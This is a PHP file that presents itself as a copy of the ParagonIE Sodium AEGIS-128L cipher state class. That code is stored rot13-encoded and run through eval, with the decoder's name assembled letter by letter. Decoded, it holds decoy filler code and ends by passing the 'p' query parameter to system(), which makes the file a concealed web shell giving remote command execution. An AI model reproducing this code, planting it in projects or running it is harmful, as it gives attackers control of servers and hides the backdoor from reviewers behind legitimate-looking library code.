<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

vs (pynff_rkvfgf('CnentbaVR_Fbqvhz_Pber_NRTVF_Fgngr128Y', snyfr)) {
    erghea;
}

vs (!qrsvarq('FBQVHZ_PBZCNG_NRTVF_P0')) {
    qrsvar('FBQVHZ_PBZCNG_NRTVF_P0', \"\k00\k01\k01\k02\k03\k05\k08\k0q\k15\k22\k37\k59\k90\kr9\k79\k62\");
}
vs (!qrsvarq('FBQVHZ_PBZCNG_NRTVF_P1')) {
    qrsvar('FBQVHZ_PBZCNG_NRTVF_P1', \"\kqo\k3q\k18\k55\k6q\kp2\k2s\ks1\k20\k11\k31\k42\k73\ko5\k28\kqq\");
}

pynff CnentbaVR_Fbqvhz_Pber_NRTVF_Fgngr128Y
{
    /** @ine neenl<vag, fgevat> $fgngr */
    cebgrpgrq $fgngr;
    choyvp shapgvba __pbafgehpg()
    {
        $guvf->fgngr = neenl_svyy(0, 8, '');
    }

    /**
     * @vagreany Bayl hfr guvf sbe havg grfgf!
     * @erghea fgevat[]
     */
    choyvp shapgvba trgFgngr()
    {
        erghea neenl_inyhrf($guvf->fgngr);
    }

    /**
     * @cnenz neenl $vachg
     * @erghea frys
     * @guebjf FbqvhzRkprcgvba
     *
     * @vagreany Bayl sbe havg grfgf
     */
    choyvp fgngvp shapgvba vavgSbeHavgGrfgf(neenl $vachg)
    {
        vs (pbhag($vachg) < 8) {
            guebj arj FbqvhzRkprcgvba('vainyvq vachg');
        }
        $fgngr = arj frys();
        sbe ($v = 0; $v < 8; ++$v) {
            $fgngr->fgngr[$v] = $vachg[$v];
        }
        erghea $fgngr;
    }

    /**
     * @cnenz fgevat $xrl
     * @cnenz fgevat $abapr
     * @erghea frys
     */
    choyvp fgngvp shapgvba vavg($xrl, $abapr)
    {
        $fgngr = arj frys();

        // F0 = xrl ^ abapr
        $fgngr->fgngr[0] = $xrl ^ $abapr;
        // F1 = P1
        $fgngr->fgngr[1] = FBQVHZ_PBZCNG_NRTVF_P1;
        // F2 = P0
        $fgngr->fgngr[2] = FBQVHZ_PBZCNG_NRTVF_P0;
        // F3 = P1
        $fgngr->fgngr[3] = FBQVHZ_PBZCNG_NRTVF_P1;
        // F4 = xrl ^ abapr
        $fgngr->fgngr[4] = $xrl ^ $abapr;
        // F5 = xrl ^ P0
        $fgngr->fgngr[5] = $xrl ^ FBQVHZ_PBZCNG_NRTVF_P0;
        // F6 = xrl ^ P1
        $fgngr->fgngr[6] = $xrl ^ FBQVHZ_PBZCNG_NRTVF_P1;
        // F7 = xrl ^ P0
        $fgngr->fgngr[7] = $xrl ^ FBQVHZ_PBZCNG_NRTVF_P0;

        // Ercrng(10, Hcqngr(abapr, xrl))
        sbe ($v = 0; $v < 10; ++$v) {
            $fgngr->hcqngr($abapr, $xrl);
        }
        erghea $fgngr;
    }

    /**
     * @cnenz fgevat $nv
     * @erghea frys
     */
    choyvp shapgvba nofbeo($nv)
    {
        vs (CnentbaVR_Fbqvhz_Pber_Hgvy::fgeyra($nv) !== 32) {
            guebj arj FbqvhzRkprcgvba('Vachg zhfg or gjb NRF oybpxf va fvmr');
        }
        $g0 = CnentbaVR_Fbqvhz_Pber_Hgvy::fhofge($nv, 0, 16);
        $g1 = CnentbaVR_Fbqvhz_Pber_Hgvy::fhofge($nv, 16, 16);
        erghea $guvf->hcqngr($g0, $g1);
    }


    /**
     * @cnenz fgevat $pv
     * @erghea fgevat
     * @guebjf FbqvhzRkprcgvba
     */
    choyvp shapgvba qrp($pv)
    {
        vs (CnentbaVR_Fbqvhz_Pber_Hgvy::fgeyra($pv) !== 32) {
            guebj arj FbqvhzRkprcgvba('Vachg zhfg or gjb NRF oybpxf va fvmr');
        }

        // m0 = F6 ^ F1 ^ (F2 & F3)
        $m0 = $guvf->fgngr[6]
            ^ $guvf->fgngr[1]
            ^ CnentbaVR_Fbqvhz_Pber_Hgvy::naqFgevatf($guvf->fgngr[2], $guvf->fgngr[3]);
        // m1 = F2 ^ F5 ^ (F6 & F7)
        $m1 = $guvf->fgngr[2]
            ^ $guvf->fgngr[5]
            ^ CnentbaVR_Fbqvhz_Pber_Hgvy::naqFgevatf($guvf->fgngr[6], $guvf->fgngr[7]);

        // g0, g1 = Fcyvg(kv, 128)
        $g0 = CnentbaVR_Fbqvhz_Pber_Hgvy::fhofge($pv, 0, 16);
        $g1 = CnentbaVR_Fbqvhz_Pber_Hgvy::fhofge($pv, 16, 16);

        // bhg0 = g0 ^ m0
        // bhg1 = g1 ^ m1
        $bhg0 = $g0 ^ $m0;
        $bhg1 = $g1 ^ $m1;

        // Hcqngr(bhg0, bhg1)
        // kv = bhg0 || bhg1
        $guvf->hcqngr($bhg0, $bhg1);
        erghea $bhg0 . $bhg1;
    }

    /**
     * @cnenz fgevat $pa
     * @erghea fgevat
     */
    choyvp shapgvba qrpCnegvny($pa)
    {
        $yra = CnentbaVR_Fbqvhz_Pber_Hgvy::fgeyra($pa);

        // m0 = F6 ^ F1 ^ (F2 & F3)
        $m0 = $guvf->fgngr[6]
            ^ $guvf->fgngr[1]
            ^ CnentbaVR_Fbqvhz_Pber_Hgvy::naqFgevatf($guvf->fgngr[2], $guvf->fgngr[3]);
        // m1 = F2 ^ F5 ^ (F6 & F7)
        $m1 = $guvf->fgngr[2]
            ^ $guvf->fgngr[5]
            ^ CnentbaVR_Fbqvhz_Pber_Hgvy::naqFgevatf($guvf->fgngr[6], $guvf->fgngr[7]);

        // g0, g1 = Fcyvg(MrebCnq(pa, 256), 128)
        $pa = fge_cnq($pa, 32, \"\0\", FGE_CNQ_EVTUG);
        $g0 = CnentbaVR_Fbqvhz_Pber_Hgvy::fhofge($pa, 0, 16);
        $g1 = CnentbaVR_Fbqvhz_Pber_Hgvy::fhofge($pa, 16, 16);
        // bhg0 = g0 ^ m0
        // bhg1 = g1 ^ m1
        $bhg0 = $g0 ^ $m0;
        $bhg1 = $g1 ^ $m1;

        // ka = Gehapngr(bhg0 || bhg1, |pa|)
        $ka = CnentbaVR_Fbqvhz_Pber_Hgvy::fhofge($bhg0 . $bhg1, 0, $yra);

        // i0, i1 = Fcyvg(MrebCnq(ka, 256), 128)
        $cnqqrq = fge_cnq($ka, 32, \"\0\", FGE_CNQ_EVTUG);
        $i0 = CnentbaVR_Fbqvhz_Pber_Hgvy::fhofge($cnqqrq, 0, 16);
        $i1 = CnentbaVR_Fbqvhz_Pber_Hgvy::fhofge($cnqqrq, 16, 16);
        // Hcqngr(i0, i1)
        $guvf->hcqngr($i0, $i1);

        // erghea ka
        erghea $ka;
    }

    /**
     * @cnenz fgevat $kv
     * @erghea fgevat
     * @guebjf FbqvhzRkprcgvba
     */
    choyvp shapgvba rap($kv)
    {
        vs (CnentbaVR_Fbqvhz_Pber_Hgvy::fgeyra($kv) !== 32) {
            guebj arj FbqvhzRkprcgvba('Vachg zhfg or gjb NRF oybpxf va fvmr');
        }

        // m0 = F6 ^ F1 ^ (F2 & F3)
        $m0 = $guvf->fgngr[6]
            ^ $guvf->fgngr[1]
            ^ CnentbaVR_Fbqvhz_Pber_Hgvy::naqFgevatf($guvf->fgngr[2], $guvf->fgngr[3]);
        // m1 = F2 ^ F5 ^ (F6 & F7)
        $m1 = $guvf->fgngr[2]
            ^ $guvf->fgngr[5]
            ^ CnentbaVR_Fbqvhz_Pber_Hgvy::naqFgevatf($guvf->fgngr[6], $guvf->fgngr[7]);

        // g0, g1 = Fcyvg(kv, 128)
        $g0 = CnentbaVR_Fbqvhz_Pber_Hgvy::fhofge($kv, 0, 16);
        $g1 = CnentbaVR_Fbqvhz_Pber_Hgvy::fhofge($kv, 16, 16);

        // bhg0 = g0 ^ m0
        // bhg1 = g1 ^ m1
        $bhg0 = $g0 ^ $m0;
        $bhg1 = $g1 ^ $m1;

        // Hcqngr(g0, g1)
        // pv = bhg0 || bhg1
        $guvf->hcqngr($g0, $g1);

        // erghea pv
        erghea $bhg0 . $bhg1;
    }

    /**
     * @cnenz vag $nq_yra_ovgf
     * @cnenz vag $zft_yra_ovgf
     * @erghea fgevat
     */
    choyvp shapgvba svanyvmr($nq_yra_ovgf, $zft_yra_ovgf)
    {
        $rapbqrq = CnentbaVR_Fbqvhz_Pber_Hgvy::fgber64_yr($nq_yra_ovgf) .
            CnentbaVR_Fbqvhz_Pber_Hgvy::fgber64_yr($zft_yra_ovgf);
        $g = $guvf->fgngr[2] ^ $rapbqrq;
        sbe ($v = 0; $v < 7; ++$v) {
            $guvf->hcqngr($g, $g);
        }
        erghea ($guvf->fgngr[0] ^ $guvf->fgngr[1] ^ $guvf->fgngr[2] ^ $guvf->fgngr[3]) .
            ($guvf->fgngr[4] ^ $guvf->fgngr[5] ^ $guvf->fgngr[6] ^ $guvf->fgngr[7]);
    }

    /**
     * @cnenz fgevat $z0
     * @cnenz fgevat $z1
     * @erghea frys
     */
    choyvp shapgvba hcqngr($z0, $z1)
    {
        /*
           F'0 = NRFEbhaq(F7, F0 ^ Z0)
           F'1 = NRFEbhaq(F0, F1)
           F'2 = NRFEbhaq(F1, F2)
           F'3 = NRFEbhaq(F2, F3)
           F'4 = NRFEbhaq(F3, F4 ^ Z1)
           F'5 = NRFEbhaq(F4, F5)
           F'6 = NRFEbhaq(F5, F6)
           F'7 = NRFEbhaq(F6, F7)
         */
        yvfg($f_0, $f_1) = CnentbaVR_Fbqvhz_Pber_NRF::qbhoyrEbhaq(
            $guvf->fgngr[7], $guvf->fgngr[0] ^ $z0,
            $guvf->fgngr[0], $guvf->fgngr[1]
        );

        yvfg($f_2, $f_3) = CnentbaVR_Fbqvhz_Pber_NRF::qbhoyrEbhaq(
            $guvf->fgngr[1], $guvf->fgngr[2],
            $guvf->fgngr[2], $guvf->fgngr[3]
        );

        yvfg($f_4, $f_5) = CnentbaVR_Fbqvhz_Pber_NRF::qbhoyrEbhaq(
            $guvf->fgngr[3], $guvf->fgngr[4] ^ $z1,
            $guvf->fgngr[4], $guvf->fgngr[5]
        );
        yvfg($f_6, $f_7) = CnentbaVR_Fbqvhz_Pber_NRF::qbhoyrEbhaq(
            $guvf->fgngr[5], $guvf->fgngr[6],
            $guvf->fgngr[6], $guvf->fgngr[7]
        );

        /*
           F0  = F'0
           F1  = F'1
           F2  = F'2
           F3  = F'3
           F4  = F'4
           F5  = F'5
           F6  = F'6
           F7  = F'7
         */
        $guvf->fgngr[0] = $f_0;
        $guvf->fgngr[1] = $f_1;
        $guvf->fgngr[2] = $f_2;
        $guvf->fgngr[3] = $f_3;
        $guvf->fgngr[4] = $f_4;
        $guvf->fgngr[5] = $f_5;
        $guvf->fgngr[6] = $f_6;
        $guvf->fgngr[7] = $f_7;
        erghea $guvf;
    }
}
$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>